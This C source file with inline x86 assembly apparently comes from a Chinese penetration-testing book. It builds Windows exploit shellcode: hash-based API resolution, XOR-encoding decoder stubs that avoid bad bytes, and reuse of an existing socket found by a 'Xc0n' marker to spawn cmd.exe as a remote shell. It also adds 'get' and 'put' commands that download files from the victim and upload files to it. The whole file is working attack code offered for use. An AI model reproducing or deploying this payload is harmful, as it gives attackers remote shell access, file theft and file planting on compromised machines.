/* shellcode_fun.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  结合文件上传下载功能的shellcode演示
*/

#define PROC_BEGIN __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
#define PROC_END PROC_BEGIN

#define Xor_key 0x33;

unsigned char sh_Buff[2048];
unsigned int  sh_Len;
unsigned int  Enc_key=0x99;

unsigned char decode1[] =
/*
00401004   . /EB 0E         JMP SHORT encode.00401014
00401006   $ |5B            POP EBX
00401007   . |4B            DEC EBX
00401008   . |33C9          XOR ECX,ECX
0040100A   . |B1 FF         MOV CL,0FF
0040100C   > |80340B 99     XOR BYTE PTR DS:[EBX+ECX],99
00401010   .^|E2 FA         LOOPD SHORT encode.0040100C
00401012   . |EB 05         JMP SHORT encode.00401019
00401014   > \E8 EDFFFFFF   CALL encode.00401006
*/
"\xEB\x0E\x5B\x4B\x33\xC9\xB1"
"\xFF"          // shellcode size
"\x80\x34\x0B"
"\x99"          // xor byte
"\xE2\xFA\xEB\x05\xE8\xED\xFF\xFF\xFF";

unsigned 
char decode2[] =
/* ripped from eyas
00406030   /EB 10           JMP SHORT 00406042
00406032   |5B              POP EBX
00406033   |4B              DEC EBX
00406034   |33C9            XOR ECX,ECX
00406036   |66:B9 6601      MOV CX,166
0040603A   |80340B 99       XOR BYTE PTR DS:[EBX+ECX],99
0040603E  ^|E2 FA           LOOPD SHORT 0040603A
00406040   |EB 05           JMP SHORT 00406047
00406042   \E8 EBFFFFFF     CALL 00406032
*/
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9"
"\x66\x01"      // shellcode size
"\x80\x34\x0B"
"\x99"          // xor byte
"\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF";

// kernel32.dll functions index
#define _LoadLibraryA           0x00
#define _CreateProcessA         0x04
#define _TerminateProcess       0x08
#define _CreatePipe             0x0C
#define _CreateNamedPipeA       0x10
#define _CloseHandle            0x14
#define _CreateEventA           0x18
#define _WaitForMultipleObjects 0x1C
#define _GetOverlappedResult    0x20
#define _CreateFileA            0x24
#define _ReadFile               0x28
#define _WriteFile              0x2C
#define _WaitForSingleObjectEx  0x30
#define _Sleep                  0x34
// ws2_32.dll functions index
#define _WSAStartup             0x38
#define _WSASocketA             0x3C
#define _setsockopt             0x40
#define _bind                   0x44
#define _listen                 0x48
#define _accept                 0x4C
#define _recv                   0x50
#define _send                   0x54
#define _WSACreateEvent         0x58
#define _WSAEventSelect         0x5C
#define _WSAEnumNetworkEvents   0x60
#define _ioctlsocket            0x64
#define _closesocket            0x68
// data index
#define _lsck                   0x6C
#define _hsck                   0x70    // socket handle
#define _hin0                   0x74    // transferring data to subprocess. incoming handler
#define _hin1                   0x78    // outgoing
#define _hout0                  0x7C    // Create named pipe and open it. incoming handler
#define _hout1                  0x80    // outgoing
#define _pi0                    0x84
#define _pi1                    0x88
#define _epip                   0x8C
#define _esck                   0x90
#define _flg                    0x94
#define _lap                    0x98
#define _cnt                    0xAC
#define _pbuf                   0xB0
#define _sbuf                   0xF0

// functions number
#define _Knums                  14
#define _Wnums                  13

// Need functions
unsigned char functions[100][128] =
{
    // kernel32
    {"LoadLibraryA"},
    {"CreateProcessA"},
    {"TerminateProcess"},
    {"CreatePipe"},
    {"CreateNamedPipeA"},
    {"CloseHandle"},
    {"CreateEventA"},
    {"WaitForMultipleObjects"},
    {"GetOverlappedResult"},
    {"CreateFileA"},
    {"ReadFile"},
    {"WriteFile"},
    {"WaitForSingleObjectEx"},
    {"Sleep"},

    // ws2_32
    {"WSAStartup"},
    {"WSASocketA"},
    {"setsockopt"},
    {"bind"},
    {"listen"},
    {"accept"},
    {"recv"},
    {"send"},
    {"WSACreateEvent"},
    {"WSAEventSelect"},
    {"WSAEnumNetworkEvents"},
    {"ioctlsocket"},
    {"closesocket"},
    
    // data
    {""},
};

void PrintSc(unsigned char *lpBuff, int buffsize);
void ShellCode();

// Get function hash
unsigned long hash(unsigned char *c)
{
    unsigned long h=0;
    while(*c)
    {
        h = ( ( h << 25 ) | ( h >> 7 ) ) + *c++;
    }
    return h;
}

// get shellcode
void GetShellCode()
{
    char  *fnbgn_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char  *fnend_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char  *pSc_addr;
    unsigned char  pSc_Buff[2048];
    unsigned int   MAX_Sc_Len=0x2000;
    unsigned long  dwHash[100];
    unsigned int   dwHashSize;

    int l,i,j,k;

    // Get functions hash
    for (i=0;;i++) {
        if (functions[i][0] == '\x0') break;

        dwHash[i] = hash(functions[i]);
        //fprintf(stderr, "%.8X\t%s\n", dwHash[i], functions[i]);
    }
    dwHashSize = i*4;

    // Deal with shellcode
    pSc_addr = (unsigned char *)ShellCode;

    for (k=0;k<MAX_Sc_Len;++k ) {
        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
            break;
        }
    }
    pSc_addr+=(k+8);   // start of the ShellCode
    
    for (k=0;k<MAX_Sc_Len;++k) {
        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
            break;
        }
    }
    sh_Len=k; // length of the ShellCode
    
    memcpy(pSc_Buff, pSc_addr, sh_Len);

    // Add functions hash
    memcpy(pSc_Buff+sh_Len, (unsigned char *)dwHash, dwHashSize);
    sh_Len += dwHashSize;

    //printf("%d bytes shellcode\n", sh_Len);
    // print shellcode
    //PrintSc(pSc_Buff, sh_Len);

    // find xor byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=0; j<sh_Len; j++)
        {
            if ( 
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//                   ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//                   ((pSc_Buff[j] ^ i) == 0x40) ||    //@
                   ((pSc_Buff[j] ^ i) == 0x00) ||
//                   ((pSc_Buff[j] ^ i) == 0x0D) ||
//                   ((pSc_Buff[j] ^ i) == 0x0A) ||
                   ((pSc_Buff[j] ^ i) == 0x5C)
                )
            {
                l++;
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;
            //printf("Find XOR Byte: 0x%02X\n", i);
            for(j=0; j<sh_Len; j++)
            {
                pSc_Buff[j] ^= Enc_key;
            }

            break;                        // break when found xor byte
        }
    }

    // No xor byte found
    if (l!=0){
        //fprintf(stderr, "No xor byte found!\n");

        sh_Len  = 0;
    }
    else {
        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);

        // encode
        if (sh_Len > 0xFF) {
            *(unsigned short *)&decode2[8] = sh_Len;
            *(unsigned char *)&decode2[13] = Enc_key;

            memcpy(sh_Buff, decode2, sizeof(decode2)-1);
            memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode2)-1;
        }
        else {
            *(unsigned char *)&decode1[7]  = sh_Len;
            *(unsigned char *)&decode1[11] = Enc_key;

            memcpy(sh_Buff, decode1, sizeof(decode1)-1);
            memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode1)-1;
        }
    }
}

// print shellcode
void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%16)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

// shellcode function
void ShellCode()
{
       __asm{

PROC_BEGIN    //C macro to begin proc

        jmp     locate_addr
func_start:
        pop     edi                             ; get eip
        mov     eax, fs:30h
        mov     eax, [eax+0Ch]
        mov     esi, [eax+1Ch]
        lodsd
        mov     ebp, [eax+8]                    ; base address of kernel32.dll

        mov     esi, edi

        push    _Knums
        pop     ecx

        GetKFuncAddr:                           ; find functions from kernel32.dll
        call    find_hashfunc_addr
        loop    GetKFuncAddr

        push    3233h
        push    5F327377h                       ; ws2_32
        push    esp
        call    dword ptr [esi+_LoadLibraryA]
        mov     ebp, eax                        ; base address of ws2_32.dll
        push    _Wnums
        pop     ecx
        
        GetWFuncAddr:                           ; find functions from ws2_32.dll
        call    find_hashfunc_addr
        loop    GetWFuncAddr
        
find_s:
        xor     ebx, ebx
        push    1000                            ; sleep to wait for character send
        call    dword ptr [esi+_Sleep]          ; maybe it is necessary in real internet
find_s_loop:
        inc     ebx                             ; socket

        push    1
        push    10
        push    ebx
        call    dword ptr [esi+_WaitForSingleObjectEx]

        test    eax, eax                        ; ensure ebx is socket
        jnz     find_s_loop
        
        push    0
        push    esp
        push    4004667Fh                       ; FIONREAD
        push    ebx
        call    dword ptr [esi+_ioctlsocket]
        pop     ecx                             ; ensure this socket have something to read
        cmp     ecx, 4
        jne     find_s_loop

        push    eax
        mov     edx, esp
        push    0
        push    4
        push    edx
        push    ebx
        call    dword ptr [esi+_recv]

        pop     eax
        cmp     eax, 6E306358h                  ; recieve "Xc0n"?
        jnz     find_s_loop

        mov     dword ptr [esi+_hsck], ebx      ; socket
        
        push    1                               ; sa.inherit=true
        push    0                               ; sa.descriptor=NULL
        push    0x0C                            ; sa.sizeof(sa)=0x0c
        mov     ebx, esp
        
        push    0xff
        push    ebx
        lea     edx, [esi+_hin0]
        push    edx
        add     edx, 4
        push    edx
        call    dword ptr [esi+_CreatePipe]
        
        push    0x305C
        push    0x65706970
        push    0x5C2E5C5C                      ; "\\.\pipe\0"
        mov     edi, esp
        
        xor     eax, eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    0xff                            ; UNLIMITED_INSTANCES
        push    eax                             ; TYPE_BYTE|READMODE_BYTE|WAIT
        push    0x40000003                      ; ACCES_DUPLEX|FLAG_OVERLAPPED
        push    edi                             ; pip="\\.\pipe\0"
        call    dword ptr [esi+_CreateNamedPipeA]
        mov     [esi+_hout1], eax
        
        xor     eax, eax
        push    eax
        push    eax
        push    3                               ; OPEN_EXISTING
        push    ebx                             ; lap
        push    eax
        push    0x02000000                      ; MAXIMUM_ALLOWED
        push    edi                             ; pip="\\.\pipe\0"
        call    dword ptr [esi+_CreateFileA]
        mov     [esi+_hout0], eax
        
        push    646D63h                         ; "cmd"
        lea     edx, [esp]

        sub     esp, 54h
        mov     edi, esp
        push    14h
        pop     ecx
        xor     eax, eax
        stack_zero:
        mov     [edi+ecx*4], eax
        loop    stack_zero

        mov     byte ptr [edi+10h], 44h         ; si.cb = sizeof(si)
        inc     byte ptr [edi+3Ch]
        inc     byte ptr [edi+3Dh]              ; si.flg=USESHOWWINDOW|USESTDHANDLES
        push    [esi+_hin1]
        pop     ebx
        mov     [edi+48h], ebx                  ; si.stdinput
        push    [esi+_hout0]
        pop     ebx
        mov     [edi+4Ch], ebx                  ; si.stdoutput
        mov     [edi+50h], ebx                  ; si.stderror
        lea     eax, [edi+10h]

        push    edi
        push    eax
        push    ecx
        push    ecx
        push    ecx
        push    1                               ; inherit=TRUE
        push    ecx
        push    ecx
        push    edx                             ; "cmd"
        push    ecx
        call    dword ptr [esi+_CreateProcessA]
        
        push    [edi]
        pop     dword ptr [esi+_pi0]
        push    [edi+4]
        pop     dword ptr [esi+_pi1]
        
        push    [esi+_hin1]
        call    dword ptr [esi+_CloseHandle]
        push    [esi+_hout0]
        call    dword ptr [esi+_CloseHandle]
        
        add     esp, 0x6C                       ; free sa struct and "\\.\pipe\0" string and si struct
        
        xor     eax, eax
        push    eax
        push    1
        push    1
        push    eax
        call    dword ptr [esi+_CreateEventA]
        mov     [esi+_epip], eax
        
        xor     ebx, ebx
        mov     [esi+_lap+0x0C], ebx
        mov     [esi+_lap+0x10], eax
        
        call    dword ptr [esi+_WSACreateEvent]
        mov     [esi+_esck], eax
        mov     dword ptr [esi+_flg], 0

k1:
        push    0x21                            ; FD_READ|FD_CLOSE
        push    [esi+_esck]
        push    [esi+_hsck]
        call    dword ptr [esi+_WSAEventSelect]

        xor     eax, eax
        dec     eax
        push    eax
        inc     eax
        push    eax
        lea     ebx, [esi+_epip]
        push    ebx
        push    2
        call    dword ptr [esi+_WaitForMultipleObjects]
        push    eax
        
        lea     ebx, [esi+_sbuf]
        push    ebx
        push    [esi+_esck]
        push    [esi+_hsck]
        call    dword ptr [esi+_WSAEnumNetworkEvents]
        
        push    0
        push    dword ptr [esi+_esck]
        push    dword ptr [esi+_hsck]
        call    dword ptr [esi+_WSAEventSelect]
        
        push    0
        push    esp
        push    0x8004667e
        push    [esi+_hsck]
        call    dword ptr [esi+_ioctlsocket]
        pop     eax
        
        pop     ecx                                     ;
        jecxz   k2
        dec     ecx
        jnz     k5
        
        push    0
        push    0x40
        lea     edx, [esi+_sbuf]
        push    edx
        push    [esi+_hsck]
        call    dword ptr [esi+_recv]
        
        lea     edx, [esi+_sbuf]
        push    eax
        pop     ecx
        call    xor_data
        
        //+-------------------------------------------
        // Add file download and upload function
        // 2004-06-09
        //
        // san
        //+-------------------------------------------
        cmp     dword ptr [esi+_sbuf], 0x20746567       ; "get "
        jz      get_file
        cmp     dword ptr [esi+_sbuf], 0x20747570       ; "put "
        jz      put_file
        
restore:
        push    0
        lea     ebx, [esi+_cnt]
        push    ebx
        push    eax                                     ; size
        lea     ebx, [esi+_sbuf]
        push    ebx
        push    [esi+_hin0]
        call    [esi+_WriteFile]
        
k2:
        mov     ecx, [esi+_flg]
        jecxz   k3
        push    eax
        lea     ebx, [esi+_cnt]
        push    ebx
        lea     ebx, [esi+_lap]
        push    ebx
        push    [esi+_hout1]
        call    dword ptr [esi+_GetOverlappedResult]
        xchg    eax, ecx
        jecxz   k5
        jmp     k4
        
k3:
        lea     ebx, [esi+_lap]
        push    ebx
        lea     ebx, [esi+_cnt]
        push    ebx
        push    0x40
        lea     ebx, [esi+_pbuf]
        push    ebx
        push    [esi+_hout1]
        call    dword ptr [esi+_ReadFile]
        inc     dword ptr [esi+_flg]
        test    eax, eax
        jz      k1
        
k4:
        lea     edx, [esi+_pbuf]
        push    [esi+_cnt]
        pop     ecx
        call    xor_data
        
        dec     dword ptr [esi+_flg]
        push    0
        mov     ebx, [esi+_cnt]
        push    ebx
        lea     ebx, [esi+_pbuf]
        push    ebx
        push    [esi+_hsck]
        call    dword ptr [esi+_send]
        jmp     k1

k5:
        push    [esi+_pi0]
        call    dword ptr [esi+_TerminateProcess]
        
        push    [esi+_pi0]
        push    [esi+_pi1]
        push    [esi+_hout1]
        push    [esi+_hin0]
        call    dword ptr [esi+_CloseHandle]
        call    dword ptr [esi+_CloseHandle]
        call    dword ptr [esi+_CloseHandle]
        call    dword ptr [esi+_CloseHandle]
        
        push    [esi+_hsck]
        call    dword ptr [esi+_closesocket]
        
        xor     eax, eax
        dec     eax
        push    eax
        call    dword ptr [esi+_TerminateProcess]

get_file:
        mov     byte ptr [esi+_sbuf+eax-1], 0
        lea     edx, [esi+_sbuf+4]              ; "get " filename
        xor     eax, eax
        push    eax
        push    eax
        push    3                               ; OPEN_EXISTING
        push    eax                             ; lap
        push    eax
        push    0x02000000                      ; MAXIMUM_ALLOWED
        push    edx
        call    dword ptr [esi+_CreateFileA]
        mov     [esi+_hout0], eax
        
    transfer:
        push    0                               ; null or &lap
        lea     edx, [esi+_cnt]
        push    edx                             ; read size actualy
        push    0x40                            ; read size
        lea     edx, [esi+_pbuf]
        push    edx
        push    [esi+_hout0]
        call    dword ptr [esi+_ReadFile]

        mov     ecx, [esi+_cnt]
        jecxz   transfer_finish                 ; None to read
        
        lea     edx, [esi+_pbuf]
        call    xor_data

        push    0
        push    [esi+_cnt]
        lea     edx, [esi+_pbuf]
        push    edx
        push    [esi+_hsck]
        call    dword ptr [esi+_send]

        jmp     transfer

    transfer_finish:
        push    [esi+_hout0]
        call    dword ptr [esi+_CloseHandle]

        jmp     k1

put_file:
        mov     byte ptr [esi+_sbuf+eax-1], 0
        lea     edx, [esi+_sbuf+4]              ; filename after "put "
        xor     eax, eax
        push    eax
        push    eax
        push    2                               ; CREATE_ALWAYS
        push    eax                             ; lap
        push    eax
        push    0x02000000                      ; MAXIMUM_ALLOWED
        push    edx
        call    dword ptr [esi+_CreateFileA]
        mov     [esi+_hout0], eax

    upload:
        push    0
        push    0x40
        lea     edx, [esi+_pbuf]
        push    edx
        push    [esi+_hsck]
        call    dword ptr [esi+_recv]
        
        lea     edx, [esi+_pbuf]
        push    eax
        pop     ecx
        call    xor_data

        push    0
        lea     edx, [esi+_cnt]
        push    edx
        push    eax
        lea     edx, [esi+_pbuf]
        push    edx
        push    [esi+_hout0]
        call    dword ptr [esi+_WriteFile]

        push    0
        push    esp
        push    4004667Fh
        push    [esi+_hsck]
        call    dword ptr [esi+_ioctlsocket]
        pop     ecx
        jecxz   upload_finish
                
        jmp upload
        
    upload_finish:
        push    [esi+_hout0]
        call    dword ptr [esi+_CloseHandle]

        mov     byte ptr [esi+_sbuf], 0x0a
        push    1h
        pop     eax
        jmp     restore

xor_data:
        dec     edx
        xor_work:
        xor     byte ptr [edx+ecx], Xor_key
        loop    xor_work
        ret

find_hashfunc_addr:
        push    ecx
        push    esi
        mov     esi, [ebp+3Ch]                  ; e_lfanew
        mov     esi, [esi+ebp+78h]              ; ExportDirectory RVA
        add     esi, ebp                        ; rva2va
        push    esi
        mov     esi, [esi+20h]                  ; AddressOfNames RVA
        add     esi, ebp                        ; rva2va
        xor     ecx, ecx
        dec     ecx
        
        find_start:
        inc     ecx
        lodsd
        add     eax, ebp
        xor     ebx, ebx
        
        hash_loop:
        movsx   edx, byte ptr [eax]
        cmp     dl, dh
        jz      short find_addr
        ror     ebx, 7                          ; hash
        add     ebx, edx
        inc     eax
        jmp     short hash_loop
     
        find_addr:
        cmp     ebx, [edi]                      ; compare to hash
        jnz     short find_start
        pop     esi                             ; ExportDirectory
        mov     ebx, [esi+24h]                  ; AddressOfNameOrdinals RVA
        add     ebx, ebp                        ; rva2va
        mov     cx, [ebx+ecx*2]                 ; FunctionOrdinal
        mov     ebx, [esi+1Ch]                  ; AddressOfFunctions RVA
        add     ebx, ebp                        ; rva2va
        mov     eax, [ebx+ecx*4]                ; FunctionAddress RVA
        add     eax, ebp                        ; rva2va
        stosd                                   ; function address save to [edi]
        pop     esi
        pop     ecx
        retn

        locate_addr:
        call    func_start

PROC_END      //C macro to end proc

        }

}